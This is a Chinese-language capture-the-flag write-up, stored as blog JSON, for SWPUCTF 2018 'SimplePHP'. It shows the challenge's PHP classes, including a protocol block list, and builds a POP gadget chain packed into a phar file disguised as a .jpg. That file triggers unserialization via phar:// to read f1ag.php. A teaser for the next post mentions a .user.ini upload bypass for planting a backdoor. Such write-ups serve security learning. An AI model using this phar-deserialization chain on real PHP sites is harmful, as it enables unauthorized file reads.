{"title":"SWPUCTF 2018-SimplePHP","uid":"fbcddf176f11d39ede5cfbba517000aa","slug":"SWPUCTF-2018-SimplePHP","date":"2023-06-25T09:04:43.000Z","updated":"2023-06-25T09:26:29.789Z","comments":true,"path":"api/articles/SWPUCTF-2018-SimplePHP.json","keywords":null,"cover":[],"content":"<p><img src=\"/images/SWPUCTF-2018-SimplePHP/1.png\"></p>\n<p>题目要求上传一个文件</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/2.png\"></p>\n<p>页面源码中可以得知flag在f1ag.php文件中</p>\n<p>在查看文件页面，通过?file传入参数查看对应文件内容</p>\n<p>file.php</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/3.png\"></p>\n<p>class.php</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/4.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\nclass C1e4r\n&#123;\n    public $test;\n    public $str;\n    public function __construct($name)\n    &#123;\n        $this-&gt;str &#x3D; $name;\n    &#125;\n    public function __destruct()\n    &#123;\n        $this-&gt;test &#x3D; $this-&gt;str;\n        echo $this-&gt;test;\n    &#125;\n&#125;\n\nclass Show\n&#123;\n    public $source;\n    public $str;\n    public function __construct($file)\n    &#123;\n        $this-&gt;source &#x3D; $file;   &#x2F;&#x2F;$this-&gt;source &#x3D; phar:&#x2F;&#x2F;phar.jpg\n        echo $this-&gt;source;\n    &#125;\n    public function __toString()    &#x2F;&#x2F;$this-&gt;str[&#39;str&#39;]-&gt;source不存在，会触发__get()方法\n    &#123;\n        $content &#x3D; $this-&gt;str[&#39;str&#39;]-&gt;source;\n        return $content;\n    &#125;\n    public function __set($key,$value)  &#x2F;&#x2F;将数据写入不可访问的属性时触发\n    &#123;\n        $this-&gt;$key &#x3D; $value;\n    &#125;\n    public function _show()\n    &#123;\n        if(preg_match(&#39;&#x2F;http|https|file:|gopher|dict|\\.\\.|f1ag&#x2F;i&#39;,$this-&gt;source)) &#123;\n            die(&#39;hacker!&#39;);\n        &#125; else &#123;\n            highlight_file($this-&gt;source);\n        &#125;\n\n    &#125;\n    public function __wakeup()\n    &#123;\n        if(preg_match(&quot;&#x2F;http|https|file:|gopher|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123;\n            echo &quot;hacker~&quot;;\n            $this-&gt;source &#x3D; &quot;index.php&quot;;\n        &#125;\n    &#125;\n&#125;\nclass Test\n&#123;\n    public $file;\n    public $params;\n    public function __construct()\n    &#123;\n        $this-&gt;params &#x3D; array();\n    &#125;\n    public function __get($key) &#x2F;&#x2F;触发后执行get($key)方法，将params[$key]的值赋给$value\n    &#123;\n        return $this-&gt;get($key);\n    &#125;\n    public function get($key)\n    &#123;\n        if(isset($this-&gt;params[$key])) &#123;\n            $value &#x3D; $this-&gt;params[$key];\n        &#125; else &#123;\n            $value &#x3D; &quot;index.php&quot;;\n        &#125;\n        return $this-&gt;file_get($value);\n    &#125;\n    public function file_get($value)    &#x2F;&#x2F;存在危险函数file_get_contents()，可作为pop链尾\n    &#123;\n        $text &#x3D; base64_encode(file_get_contents($value));\n        return $text;\n    &#125;\n&#125;\n?&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>function.php</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/5.png\"></p>\n<p>在file.php中通过file传入来查看文件内容，并调用了file_exists()函数，可以通过phar实现反序列化来获取flag</p>\n<p>对于class.php中的几个类</p>\n<p>C1e4r类中的__destruct()在类被销毁时自动调用，因此可作为pop链的链头，Test类中调用了file_get_contents方法，可作为pop链尾</p>\n<p>Show类中的__ toString()方法中$this-&gt;str[‘str’]-&gt;source不存在，会触发__get()方法</p>\n<p>__set()方法将数据写入不可访问的属性时触发</p>\n<p>Test类中的__get()方法触发后执行get($key)方法，将params[$key]的值赋给$value</p>\n<p>构造pop链</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$c &#x3D; new C1e4r();\n$show &#x3D; new Show();\n$test &#x3D; new Test();\n$c-&gt;str &#x3D; $show;\n\n$show-&gt;str[&#39;str&#39;] &#x3D; $test;\n$test-&gt;params[&#39;source&#39;] &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f1ag.php&#39;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>生成phar文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">$phar &#x3D; new Phar(&#39;php.phar&#39;);\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);\n\n$phar-&gt;setMetadata($c);\n$phar-&gt;addFromString(&#39;test.txt&#39;,&quot;test&quot;);\n\n$phar-&gt;stopBuffering();;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将生成的文件后缀改为jpg</p>\n<p>在upload路径下可以查看上传的文件名</p>\n<p>在file.php中用phar协议访问</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/6.png\"></p>\n<p>base64解密得到flag</p>\n<p><img src=\"/images/SWPUCTF-2018-SimplePHP/7.png\"></p>\n","feature":true,"text":" 题目要求上传一个文件 页面源码中可以得知flag在f1ag.php文件中 在查看文件页面，通过?file传入参数查看对应文件内容 file.php class.php &lt;?php class C1e4r &#123; public $test; public $str; ...","link":"","photos":[],"count_time":{"symbolsCount":"3.3k","symbolsTime":"3 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"SUCTF 2019-CheckIn","uid":"7028e45966f0fd8a9175e6d471456f27","slug":"SUCTF-2019-CheckIn","date":"2023-04-12T12:42:18.000Z","updated":"2023-04-12T12:51:19.358Z","comments":true,"path":"api/articles/SUCTF-2019-CheckIn.json","keywords":null,"cover":[],"text":" 文件上传，对文件类型，后缀名，文件内容都进行了过滤 用.uer.ini绕过 利用.user.ini指定文件，在当前目录下的文件执行时会将指定文件中的代码执行出来，以此实现带入后门 准备一个.user.ini文件，内容如下 GIF89a? auto_prepend_file &#...","link":"","photos":[],"count_time":{"symbolsCount":315,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"后缀名绕过","slug":"后缀名绕过","count":1,"path":"api/tags/后缀名绕过.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}